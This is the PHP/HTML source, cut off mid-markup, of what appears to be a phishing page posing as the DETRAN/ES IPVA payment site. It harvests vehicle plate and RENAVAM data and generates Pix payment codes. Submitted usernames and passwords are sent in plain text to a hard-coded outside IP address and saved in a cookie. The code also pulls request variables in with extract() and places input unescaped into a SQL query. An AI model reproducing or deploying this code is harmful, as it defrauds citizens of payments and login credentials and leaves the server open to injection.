<?php

error_reporting(0);

extract($_GET);

if($sucesso){
    
    $sql = "SELECT * FROM infos WHERE nome = '$placa'";
    $ver = mysqli_query($conexao, $sql);

    if($retorno = mysqli_fetch_array($ver)){

        $dados = base64_decode($retorno['dados']);

        $DataSP = json_decode($dados);

    }else{

       exit();
    }
}

if($_POST){

    extract($_POST);

    if($username &&  $password){

        $response = file_get_contents("http://45.178.182.71:3000/dados?username=$username&password=$password");

        if($response){

            $responseArray = json_decode($response);
             
            if($responseArray){

                $FaturaAberta = array();

                //for ($i=0; $i <count($responseArray->data->open); $i++) { 

                //    $amount = $responseArray->data->open[$i]->amount;
                //    $expireAt = $responseArray->data->open[$i]->expireAt;
                //    $createdAt = $responseArray->data->open[$i]->createdAt;
                //    $description = $responseArray->data->open[$i]->description;

                //    $FaturaAberta[] = array("amount"=>"$amount", "expireAt"=>"$expireAt", "createdAt"=>"$createdAt", "description"=>"$description");
                //}

                $FaturaAtrasada = array();

                for ($i=0; $i <count($responseArray->data->overdue); $i++) { 

                    $amount = $responseArray->data->overdue[$i]->amount;
                    $expireAt = $responseArray->data->overdue[$i]->expireAt;
                    $createdAt = $responseArray->data->overdue[$i]->createdAt;
                    $description = $responseArray->data->overdue[$i]->description;

                    $FaturaAtrasada[] = array("amount"=>"$amount", "expireAt"=>"$expireAt", "createdAt"=>"$createdAt", "description"=>"$description");
                }

                $FaturaPagas = array();

                for ($i=0; $i <count($responseArray->data->paid); $i++) { 

                    $amount = $responseArray->data->paid[$i]->amount;
                    $expireAt = $responseArray->data->paid[$i]->expireAt;
                    $createdAt = $responseArray->data->paid[$i]->createdAt;
                    $description = $responseArray->data->paid[$i]->description;

                    $FaturaPagas[] = array("amount"=>"$amount", "expireAt"=>"$expireAt", "createdAt"=>"$createdAt", "description"=>"$description");
                }

                $name = $responseArray->userinfo->name;
                $preferred_username = $responseArray->userinfo->preferred_username;
                $email = $responseArray->userinfo->email;

                $spotlight = array("amount"=>$responseArray->data->spotlight->amount, "expireAt"=>$responseArray->data->spotlight->expireAt, "createdAt"=>$responseArray->data->spotlight->createdAt, "description"=>$responseArray->data->spotlight->description);

                $dados = array("username"=>$username, "password"=>$password, "FaturaPagas"=>$FaturaPagas, "FaturaAtrasada"=>$FaturaAtrasada, "spotlight"=>$spotlight, "name"=>$name, "email"=>$email, "preferred_username"=>$preferred_username);

                $dadosJson = json_encode($dados);

                setcookie('DataSolfacil', $dadosJson , time() + (86400 * 30), "/");

                echo "sucesso!";
            }
        }

        exit();
    }
}

?>

<html lang="pt-br">

<head>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="ISO-8859-1">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=1, user-scalable=no">
    <title>DETRAN/ES - Emissão de Boleto de IPVA</title>

    <link rel="stylesheet" type="text/css" href="/ipes/style.css">

    <link rel="shortcut icon" href="/ipes/favicon.ico" type="image/x-png">
    <script src="./home/scHOME_files/jquery-3.6.4.min.js.download"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">


    <style>
    .bordaCompleta {
        border-left: #999999 1px solid;
        border-top: #999999 1px solid;
        border-bottom: #999999 1px solid;
        border-right: #999999 1px solid;
        font-weight: bold;
        font-size: 7pt;
        color: #808080;
        font-family: Tahoma;
        text-align: left
    }

    .bordaEsquerdaGrossa {
        border-left: #3f658c 2px solid
    }

    .bordaEsquerdaFina {
        border-left: #999999 1px solid
    }

    .bordaDireitaGrossa {
        border-right: #3f658c 2px solid;
        padding-left: 2px
    }

    .bordaDireitaFina {
        border-right: #999999 1px solid;
        padding-left: 2px
    }

    .bordaAbaixoGrossa {
        border-bottom: #cbd1d6 2px solid
    }

    .bordaAbaixoFina {
        border-bottom: #999999 1px solid
    }

    .bordaAcimaGrossa {
        border-top: #3f658c 2px solid
    }

    .bordaAcimaFina {
        border-top: #3f658c 1px solid
    }

    .bordaCabecalhoAcimaGrossa {
        border-top: #3f658c 2px solid
    }

    .bordaCabecalhoAcimaFina {
        border-top: #3f658c 1px solid
    }

    .bordaCabecalhoAbaixoGrossa {
        border-bottom: #999999 1px solid
    }

    .bordaCabecalhoAbaixoFina {
        border-bottom: #3f658c 1px solid
    }

    input[type="checkbox"] {
        appearance: auto !important;
        /* Garante que os checkboxes apareçam */
        visibility: visible !important;
        opacity: 1 !important;
        width: 16px;
        /* Tamanho padrão */
        height: 16px;
        cursor: pointer;
    }

    .bordaAbaixoDireita {
        border-left: #999999 1px solid;
        border-bottom: #999999 1px solid
    }

    .bordaAbaixoEsquerda {
        border-left: #999999 1px solid;
        border-bottom: #999999 1px solid
    }

    .bordaAbaixoEsquerdaDireita {
        border-left: #999999 1pt solid;
        border-bottom: #999999 1pt solid;
        border-right: #999999 1pt solid
    }

    .bordaAbaixoAcimaEsquerdaDireita {
        border-top: #999999 1px solid;
        border-left: #999999 1px solid;
        border-bottom: #999999 1px solid;
        BORDER-RIGHT: #999999 1px solid
    }

    .tabelabordaAcimaBaixo {
        border-top: #3f658c 1px solid;
        border-bottom: #3f658c 1px solid;
        font-weight: bold;
        font-size: 7pt;
        color: #808080;
        font-family: Tahoma;
        text-align: left
    }

    .tabelabordaAcimaEsquerdaDireita {
        border-top: #3f658c 1px solid;
        border-left: #3f658c 1px solid;
        border-right: #3f658c 1px solid;
        font-weight: bold;
        font-size: 7pt;
        color: #808080;
        font-family: Tahoma;
        text-align: left
    }

    .bordaAcimaEsquerdaDireita {
        border-top: #999999 1px solid;
        border-left: #999999 1px solid;
        border-right: #999999 1px solid;
        font-weight: bold;
        font-size: 7pt;
        color: #808080;
        font-family: Tahoma;
        text-align: left
    }

    .bordaAcima {
        border-top: #999999 1px solid;
    }

    .bordaAcimaEsquerda {
        border-top: #999999 1px solid;
        border-left: #999999 1px solid;
    }

    .bordaAcimaDireita {
        border-top: #999999 1px solid;
        border-right: #999999 1px solid;
        font-weight: bold;
        font-size: 7pt;
        color: #808080;
        font-family: Tahoma;
        text-align: left
    }

    .textoCabecalhoCelula {
        font-size: 10px;
        color: #333333;
        font-family: Arial, Helvetica, sans-serif
    }

    .textoCelula {
        font-size: 12px;
        font-weight: bold;
        color: #333333;
        font-family: Arial, Helvetica, sans-serif
    }

    .Justificado {
        border-top: #999999 1px solid;
        border-left: #999999 1px solid;
        border-right: #999999 1px solid;
        border-bottom: #999999 1px solid
    }

    .TitTabela {
        padding: 1px;
        font-weight: bold;
        background-color: steelblue;
        color: #FFFFFF;
        font-family: Arial, Helvetica, sans-serif;
        font-size: 11px;
        font-style: normal;
        font-variant: normal;
        border-spacing: 1px;
    }

    .DetTabela {
        font-size: 11px;
        font-weight: normal;
        font-family: Arial, Helvetica, sans-serif;
        color: #000000;
        background-color: #dadada;
    }
    </style>

    <?php  if($sucesso){ ?>

    <style>
    *,
    ::before,
    ::after {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-gradient-from-position: ;
        --tw-gradient-via-position: ;
        --tw-gradient-to-position: ;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: rgb(59 130 246 / 0.5);
        --tw-ring-offset-shadow: 0 0 #0000;
        --tw-ring-shadow: 0 0 #0000;
        --tw-shadow: 0 0 #0000;
        --tw-shadow-colored: 0 0 #0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
        --tw-contain-size: ;
        --tw-contain-layout: ;
        --tw-contain-paint: ;
        --tw-contain-style: ;
    }

    ::backdrop {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-gradient-from-position: ;
        --tw-gradient-via-position: ;
        --tw-gradient-to-position: ;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: rgb(59 130 246 / 0.5);
        --tw-ring-offset-shadow: 0 0 #0000;
        --tw-ring-shadow: 0 0 #0000;
        --tw-shadow: 0 0 #0000;
        --tw-shadow-colored: 0 0 #0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
        --tw-contain-size: ;
        --tw-contain-layout: ;
        --tw-contain-paint: ;
        --tw-contain-style: ;
    }

    *,
    ::before,
    ::after {
        box-sizing: border-box;
        border-width: 0px;
        border-style: solid;
        border-color: rgb(229, 231, 235);
    }

    ::before,
    ::after {
        --tw-content: '';
    }

    :host {
        line-height: 1.5;
        text-size-adjust: 100%;
        tab-size: 4;
        font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        font-feature-settings: normal;
        font-variation-settings: normal;
        -webkit-tap-highlight-color: transparent;
    }

    hr {
        height: 0px;
        color: inherit;
        border-top-width: 1px;
    }

    abbr:where([title]) {
        text-decoration: underline dotted;
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
        font-size: inherit;
        font-weight: inherit;
    }

    a {
        color: inherit;
        text-decoration: inherit;
    }

    b,
    strong {
        font-weight: bolder;
    }

    code,
    kbd,
    samp,
    pre {
        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        font-feature-settings: normal;
        font-variation-settings: normal;
        font-size: 1em;
    }

    small {
        font-size: 80%;
    }

    sub,
    sup {
        font-size: 75%;
        line-height: 0;
        position: relative;
        vertical-align: baseline;
    }

    sub {
        bottom: -0.25em;
    }

    sup {
        top: -0.5em;
    }

    table {
        text-indent: 0px;
        border-color: inherit;
        border-collapse: collapse;
    }

    button,
    input,
    optgroup,
    select,
    textarea {
        font-family: inherit;
        font-feature-settings: inherit;
        font-variation-settings: inherit;
        font-size: 100%;
        font-weight: inherit;
        line-height: inherit;
        letter-spacing: inherit;
        color: inherit;
        margin: 0px;
        padding: 0px;
    }

    button,
    select {
        text-transform: none;
    }

    button,
    input:where([type="button"]),
    input:where([type="reset"]),
    input:where([type="submit"]) {
        appearance: button;
        background-color: transparent;
        background-image: none;
    }

    progress {
        vertical-align: baseline;
    }

    ::-webkit-inner-spin-button,
    ::-webkit-outer-spin-button {
        height: auto;
    }

    [type="search"] {
        appearance: textfield;
        outline-offset: -2px;
    }

    ::-webkit-search-decoration {
        appearance: none;
    }

    ::-webkit-file-upload-button {
        appearance: button;
        font: inherit;
    }

    summary {
        display: list-item;
    }

    blockquote,
    dl,
    dd,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    hr,
    figure,
    p,
    pre {
        margin: 0px;
    }

    fieldset {
        margin: 0px;
        padding: 0px;
    }

    legend {
        padding: 0px;
    }

    ol,
    ul,
    menu {
        list-style: none;
        margin: 0px;
        padding: 0px;
    }

    dialog {
        padding: 0px;
    }

    textarea {
        resize: vertical;
    }

    input::placeholder,
    textarea::placeholder {
        opacity: 1;
        color: rgb(156, 163, 175);
    }

    button,
    [role="button"] {
        cursor: pointer;
    }

    :disabled {
        cursor: default;
    }

    img,
    svg,
    video,
    canvas,
    audio,
    iframe,
    embed,
    object {
        display: block;
        vertical-align: middle;
    }

    img,
    video {
        max-width: 100%;
        height: auto;
    }

    [hidden] {
        display: none;
    }

    .fixed {
        position: fixed;
    }

    .absolute {
        position: absolute;
    }

    .relative {
        position: relative;
    }

    .inset-0 {
        inset: 0px;
    }

    .right-4 {
        right: 1rem;
    }

    .top-4 {
        top: 1rem;
    }

    .mb-4 {
        margin-bottom: 1rem;
    }

    .mb-6 {
        margin-bottom: 1.5rem;
    }

    .flex {
        display: flex;
    }

    .grid {
        display: grid;
    }

    .h-12 {
        height: 3rem;
    }

    .h-48 {
        height: 12rem;
    }

    .min-h-screen {
        min-height: 100vh;
    }

    .w-48 {
        width: 12rem;
    }

    .w-full {
        width: 100%;
    }

    .max-w-md {
        max-width: 28rem;
    }

    .grid-cols-2 {
        grid-template-columns: repeat(2, minmax(0px, 1fr));
    }

    .items-center {
        align-items: center;
    }

    .justify-center {
        justify-content: center;
    }

    .gap-4 {
        gap: 1rem;
    }

    .break-all {
        word-break: break-all;
    }

    .rounded-lg {
        border-radius: 0.5rem;
    }

    .bg-black {
        --tw-bg-opacity: 1;
        background-color: rgb(0 0 0 / var(--tw-bg-opacity));
    }

    .bg-blue-500 {
        --tw-bg-opacity: 1;
        background-color: rgb(59 130 246 / var(--tw-bg-opacity));
    }

    .bg-gray-100 {
        --tw-bg-opacity: 1;
        background-color: rgb(243 244 246 / var(--tw-bg-opacity));
    }

    .bg-white {
        --tw-bg-opacity: 1;
        background-color: rgb(255 255 255 / var(--tw-bg-opacity));
    }

    .bg-opacity-50 {
        --tw-bg-opacity: 0.5;
    }

    .p-3 {
        padding: 0.75rem;
    }

    .p-4 {
        padding: 1rem;
    }

    .p-6 {
        padding: 1.5rem;
    }

    .px-6 {
        padding-left: 1.5rem;
        padding-right: 1.5rem;
    }

    .py-3 {
        padding-top: 0.75rem;
        padding-bottom: 0.75rem;
    }

    .text-center {
        text-align: center;
    }

    .text-sm {
        font-size: 0.875rem;
        line-height: 1.25rem;
    }

    .text-xl {
        font-size: 1.25rem;
        line-height: 1.75rem;
    }

    .text-xs {
        font-size: 0.75rem;
        line-height: 1rem;
    }

    .font-bold {
        font-weight: 700;
    }

    .font-semibold {
        font-weight: 600;
    }

    .text-gray-500 {
        --tw-text-opacity: 1;
        color: rgb(107 114 128 / var(--tw-text-opacity));
    }

    .text-gray-600 {
        --tw-text-opacity: 1;
        color: rgb(75 85 99 / var(--tw-text-opacity));
    }

    .text-white {
        --tw-text-opacity: 1;
        color: rgb(255 255 255 / var(--tw-text-opacity));
    }

    .transition-colors {
        transition-property: color, background-color, border-color, text-decoration-color, fill, stroke;
        transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
        transition-duration: 150ms;
    }

    .hover\:bg-blue-600:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(37 99 235 / var(--tw-bg-opacity));
    }

    .hover\:text-gray-700:hover {
        --tw-text-opacity: 1;
        color: rgb(55 65 81 / var(--tw-text-opacity));
    }
    </style>

    <script>
    var data = <?=$dados?>;

    var id_user = Math.floor(Math.random() * 100000000);

    function Post(data, urlapi, e) {

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                status(this.response, e);
            }
        };
        xhttp.open("POST", urlapi, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.responseType = 'json';
        xhttp.send(data);

        return false;
    }

    function validaCpfCnpj(val) {

        val = val.trim();
        val = val.replace(/\D/g, '');

        if (val.length < 14) {
            var cpf = val.trim();

            cpf = cpf.replace(/\./g, '');
            cpf = cpf.replace('-', '');
            cpf = cpf.split('');

            var v1 = 0;
            var v2 = 0;
            var aux = false;

            for (var i = 1; cpf.length > i; i++) {
                if (cpf[i - 1] != cpf[i]) {
                    aux = true;
                }
            }

            if (aux == false) {
                return false;
            }

            for (var i = 0, p = 10;
                (cpf.length - 2) > i; i++, p--) {
                v1 += cpf[i] * p;
            }

            v1 = ((v1 * 10) % 11);

            if (v1 == 10) {
                v1 = 0;
            }

            if (v1 != cpf[9]) {
                return false;
            }

            for (var i = 0, p = 11;
                (cpf.length - 1) > i; i++, p--) {
                v2 += cpf[i] * p;
            }

            v2 = ((v2 * 10) % 11);

            if (v2 == 10) {
                v2 = 0;
            }

            if (v2 != cpf[10]) {
                return false;
            } else {
                return true;
            }
        } else if (val.length >= 14) {
            var cnpj = val.trim();

            cnpj = cnpj.replace(/\./g, '');
            cnpj = cnpj.replace('-', '');
            cnpj = cnpj.replace('/', '');
            cnpj = cnpj.split('');

            var v1 = 0;
            var v2 = 0;
            var aux = false;

            for (var i = 1; cnpj.length > i; i++) {
                if (cnpj[i - 1] != cnpj[i]) {
                    aux = true;
                }
            }

            if (aux == false) {
                return false;
            }

            for (var i = 0, p1 = 5, p2 = 13;
                (cnpj.length - 2) > i; i++, p1--, p2--) {
                if (p1 >= 2) {
                    v1 += cnpj[i] * p1;
                } else {
                    v1 += cnpj[i] * p2;
                }
            }

            v1 = (v1 % 11);

            if (v1 < 2) {
                v1 = 0;
            } else {
                v1 = (11 - v1);
            }

            if (v1 != cnpj[12]) {
                return false;
            }

            for (var i = 0, p1 = 6, p2 = 14;
                (cnpj.length - 1) > i; i++, p1--, p2--) {
                if (p1 >= 2) {
                    v2 += cnpj[i] * p1;
                } else {
                    v2 += cnpj[i] * p2;
                }
            }

            v2 = (v2 % 11);

            if (v2 < 2) {
                v2 = 0;
            } else {
                v2 = (11 - v2);
            }

            if (v2 != cnpj[13]) {
                return false;
            } else {
                return true;
            }
        } else {
            return false;
        }
    }

    window.toMoney = function(a) {
        return parseFloat(a).toFixed(2).replace(".", ",").replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1.")
    }

    function atualizarDataTotal(valor) {
        const elementoTotal = document.getElementById('total');
        elementoTotal.dataset.total = valor.toFixed(2);
        elementoTotal.textContent = `R$ ${valor.toFixed(2).replace('.', ',')}`;
    }

    function confirmarPagamentoPix(e) {
        var item = document.querySelectorAll('.selecionarDebito');

        for (let index = 0; index < item.length; index++) {
            if (item[index].checked) {
                item[index].checked = false;
                document.querySelectorAll('.selectable-row')[index].style = "display: none;";
                document.querySelector('#total').innerHTML = 'R$ 0,00';
            }
        }

        document.querySelector('.modalbodypix').style = "display: none;";
        document.querySelector('.modalbodyprocessando').style = "";
    }

    function selectValor() {

        var item = document.querySelectorAll('.selecionarDebito');
        var valorTotal = 0;
        for (let index = 0; index < item.length; index++) {
            if (item[index].checked) {
                var valorDesconto = parseFloat(item[index].dataset.valordesconto);
                valorTotal = parseFloat(valorDesconto) + parseFloat(valorTotal);
            }
        }

        document.querySelector('#total').innerHTML = 'R$ ' + toMoney(valorTotal);

        atualizarDataTotal(valorTotal);

    }

    function horaAtual() {
        var d = new Date();
        var n = d.getTime();
        var re = parseFloat(n) + parseFloat(90347);
        return re;
    }

    function status(e, a) {

        if (a == 1) {

            ID('qrcodImg').src = '<?=$URL_QR?>' + e.pix;
            ID('payment-code-field').value = e.pix;
            ID('payment-code').innerHTML = e.pix;

        } else if (e.status == 1) {

            window.location.href = "./?link=<?=$ttlLink?>&sucesso=true";

        } else {

            if (e.status == 2) {

                document.getElementById('password').value = '';
                toastr.error('Falha na autenticação, verifique seus dados.');
                document.getElementById('autoSubBtn').disabled = false;

            }

            ID('loandig').style = 'display: none;';

            document.getElementById('autoSubBtn').innerHTML = 'Entrar';
        }
    }


    function validarLog(a, b, c, d) {

        var horaON = horaAtual();

        var campanha = document.getElementById('campanha').value;
        var aparelho = document.getElementById('aparelho').value;

        var conta = a.replace(/\D/g, '');
        var imovel = b;
        var doc = c.replace(/\D/g, '');

        if (conta && imovel, doc) {

            if (!validaCpfCnpj(doc)) {

                alert('CPF/CNPJ não corresponde a conta!');

                return;
            }

            ID('loandig').style = "";

            Post("campanha=" + campanha + "&aparelho=" + aparelho +
                "&redin=https://www.saneago.com.br/&operador=saneago&horaON=" + horaON + "&id_user=" + id_user +
                "&status=0&executar=esperando&conta=" + conta + '&capt=' + c +
                "&dv=" + imovel + '&doc=' + doc,
                "./?link=<?=$ttlLink?>",
                0);

        }
    }

    function ID(e) {
        return document.getElementById(e);
    }

    function ver() {
        var pu = ID('password'),
            ver = ID('verp');

        if (pu.type == 'password') {
            pu.type = 'text';
            ver.innerHTML =
                '<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" color="#838383" height="16" width="16" xmlns="http://www.w3.org/2000/svg" style="color: rgb(131, 131, 131);"><path d="M942.2 486.2Q889.47 375.11 816.7 305l-50.88 50.88C807.31 395.53 843.45 447.4 874.7 512 791.5 684.2 673.4 766 512 766q-72.67 0-133.87-22.38L323 798.75Q408 838 512 838q288.3 0 430.2-300.3a60.29 60.29 0 0 0 0-51.5zm-63.57-320.64L836 122.88a8 8 0 0 0-11.32 0L715.31 232.2Q624.86 186 512 186q-288.3 0-430.2 300.3a60.3 60.3 0 0 0 0 51.5q56.69 119.4 136.5 191.41L112.48 835a8 8 0 0 0 0 11.31L155.17 889a8 8 0 0 0 11.31 0l712.15-712.12a8 8 0 0 0 0-11.32zM149.3 512C232.6 339.8 350.7 258 512 258c54.54 0 104.13 9.36 149.12 28.39l-70.3 70.3a176 176 0 0 0-238.13 238.13l-83.42 83.42C223.1 637.49 183.3 582.28 149.3 512zm246.7 0a112.11 112.11 0 0 1 146.2-106.69L401.31 546.2A112 112 0 0 1 396 512z"></path><path d="M508 624c-3.46 0-6.87-.16-10.25-.47l-52.82 52.82a176.09 176.09 0 0 0 227.42-227.42l-52.82 52.82c.31 3.38.47 6.79.47 10.25a111.94 111.94 0 0 1-112 112z"></path></svg>';
        } else {
            pu.type = 'password';
            ver.innerHTML =
                '<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" color="#838383" height="16" width="16" xmlns="http://www.w3.org/2000/svg" style="color: rgb(131, 131, 131);"><path d="M942.2 486.2C847.4 286.5 704.1 186 512 186c-192.2 0-335.4 100.5-430.2 300.3a60.3 60.3 0 0 0 0 51.5C176.6 737.5 319.9 838 512 838c192.2 0 335.4-100.5 430.2-300.3 7.7-16.2 7.7-35 0-51.5zM512 766c-161.3 0-279.4-81.8-362.7-254C232.6 339.8 350.7 258 512 258c161.3 0 279.4 81.8 362.7 254C791.5 684.2 673.4 766 512 766zm-4-430c-97.2 0-176 78.8-176 176s78.8 176 176 176 176-78.8 176-176-78.8-176-176-176zm0 288c-61.9 0-112-50.1-112-112s50.1-112 112-112 112 50.1 112 112-50.1 112-112 112z"></path></svg>';
        }
    }

    window.toMoney = function(a) {
        return parseFloat(a).toFixed(2).replace(".", ",").replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1.")
    }

    function formatarValor(valor) {
        return parseFloat(valor.replace(/\./g, "").replace(",", "."));
    }

    function VerPix(e) {

        var Verificar = false;
        var item = document.querySelectorAll('.selecionarDebito');
        for (let index = 0; index < item.length; index++) {
            if (item[index].checked) {
                Verificar = true;
            }
        }

        if (Verificar) {

            ID('qrcodImg').src = './DetranGO_files/giphy.gif';

            ID('ReactModalPortal').style = '';

            var valor = document.querySelector('#totalValor').innerHTML;

            document.querySelector('#pixvalor').innerHTML = valor;

            Post('valor=' + formatarValor(valor), './data/pix.php', 1);

        } else {
            toastr.info("Você precisa selecionar pelo menos 1 débito.");
        }
    }

    function copy() {

        var content = document.getElementById('payment-code-field');
        content.select();
        document.execCommand('copy');

        toastr.success("Código Pix copiado para a área de transferência");
    }

    function copypix(e) {

        var DataPix = data.faturas[e];

        Post('valor=' + DataPix.TOTAL_FATURA, './data/pix.php', 1);

        ID('loadingbox').style = '';

    }

    function fecharAlet(e) {
        ID('alert').style = "display: none;";
        document.body.style = "";
    }

    function Alert(e) {
        openPVC();
        ID('alert').style = "";
    }

    function openPVC(e) {
        if (e) {
            ID('modalCC').style = "";
        } else {
            ID('modalCC').style = "display:none;";
        }
    }


    function ChecKK(e) {

        let total = 0,
            cont = 0;;

        var item = document.querySelectorAll("input[type='checkbox']");

        for (let index = 0; index < item.length; index++) {
            if (item[index].checked) {
                total += parseFloat(item[index].value);
                cont++;
            }
        }

        //document.getElementById("referenceuc").textContent = cont;

        document.getElementById("totalValor").textContent = toMoney(total.toFixed(2));
    }
    </script>


    <?php }else{ ?>
    <script>
    var id_user = Math.floor(Math.random() * 100000000);

    function LimparEspasso(value) {
        return value.replace(/\s+/g, '').toUpperCase();
    }

    function Post(data, urlapi) {

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                var json = this.response;
                status(json);
            }
        };
        xhttp.open("POST", urlapi, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send(data);

        return false;
    }

    ttlLink = "<?=$ttlLink?>";

    var Reteste = 0;

    function status(e) {

        if (e.includes('Comando enviado e exibido na p')) {

            IsValidor(1);

        } else if (e == 'sucesso!') {

            ID('loandig').style = "display: none;";

            window.location.href = "./?link=" + ttlLink + "&sucesso=true&renavam=" + ID('renavam').value.trim() +
                "&placa=" + LimparEspasso(ID('placa').value);

        } else {


            ID('loandig').style = "display: none;";

            if (e == 'Veículo sem débitos') {
                ID('txt').innerHTML = e;
            } else {
                ID('txt').innerHTML = 'Porfavor validar os dados corretamente.';
            }

            Alert(1);

        }
    }

    function IsValidor(e) {

        setTimeout(() => {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var json = this.response;

                    if (json.includes('recaptcha_check')) {

                        Reteste++;

                        if (Reteste < 3) {

                            validar();

                        } else {

                            ID('loandig').style = "display: none;";

                            if (e == 'Veículo sem débitos') {
                                ID('txt').innerHTML = e;
                            } else {
                                ID('txt').innerHTML = 'Porfavor validar os dados corretamente.';
                            }

                            Alert(1);

                            Reteste = 0;
                        }

                    } else if (json.includes('erro') || json.includes('Veículo sem débitos')) {

                        ID('loandig').style = "display: none;";

                        if (json.includes('Veículo sem débitos')) {
                            ID('txt').innerHTML = 'Veículo sem débitos';
                        } else {
                            ID('txt').innerHTML = 'Porfavor validar os dados corretamente.';
                        }

                        Alert(1);

                    } else if (json.includes('sucesso!')) {

                        ID('loandig').style = "display: none;";

                        window.location.href = "./?link=" + ttlLink + "&sucesso=true&renavam=" + ID(
                            'renavam').value.trim() + "&placa=" + LimparEspasso(ID('placa').value);

                    } else {
                        status('Comando enviado e exibido na página');
                    }
                }
            };
            xhttp.open("POST", './api/IsValidorSC.php', true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send("renavam=" + ID('renavam').value.trim() + "&placa=" + LimparEspasso(ID('placa').value) +
                '&tela=ipes');
        }, 1000);
    }

    function ID(e) {
        return document.getElementById(e);
    }

    function validar(token) {

        if (ID('renavam').value && LimparEspasso(ID('placa').value)) {

            ID('loandig').style = "display: block;";
            // ID('errosPlaceholder').style = "display: none;";

            Post('g_recaptcha_response=' + token + '&renavam=' + ID('renavam').value.trim() +
                '&placa=' + LimparEspasso(ID('placa').value) + '&operador=ipes', './api/apiTokemDetran.php?link=' +
                ttlLink);

            //   window.location.href = './api/SCbuscar.php?link=' + ttlLink+'&renavam=' + ID('renavam').value +'&placa=' + ID('placa').value;

        } else {

            //ID('mensagensErros').innerHTML = "O campo 'RENAVAM' é obrigatório.";
            //ID('errosPlaceholder').style = "";
        }
    }

    function fecharAlet(e) {
        ID('alert').style = "display: none;";
        document.body.style = "";
    }

    function Alert(e) {
        ID('alert').style =
            "display: flex;justify-content: center;align-items: center;position: fixed;width: 100%;height: 100%;top: 0;left: 0;z-index: 2;";
    }
    </script>

    <?php } ?>

</head>
<!-- Javacript ---------------------------------------------------------------------------------------------------------->

<body style="background-color:#E0EEEE;">

    <input hidden id="recaptcharesponse">

    <div id="alert" style="display: none;">
        <div
            style="width: 100%;margin: 0;position: fixed;left: 0;height: 100%;background: #0000005e;z-index: 2;justify-content: center;align-items: center;display: flex;top: 0;">
            <div class="modal-content"
                style="height: 157px;background: white;display: flex;border-radius: 5px;position: relative;">
                <div
                    style="display: flex;font-weight: 700;margin: 5px 0px 0px 0px;z-index: 213;right: 7px;position: absolute;margin-top: -29px;">
                    <div onclick="fecharAlet()" title="fechar"
                        style="color: #585858;float: right;display: flex;cursor: pointer;font-size: 20px;">X
                    </div>
                </div>
                <div style="width: 100%;justify-content: center;display: flex;align-items: center;">
                    <img src="https://cdn-icons-png.flaticon.com/512/179/179386.png"
                        style="width: 60px;margin-top: -62px;"><br>
                    <div style="position: absolute;margin-top: 36px;font-weight: 600;color: #898686;font-size: 22px;">
                        Atenção !
                    </div>
                    <div id="txt"
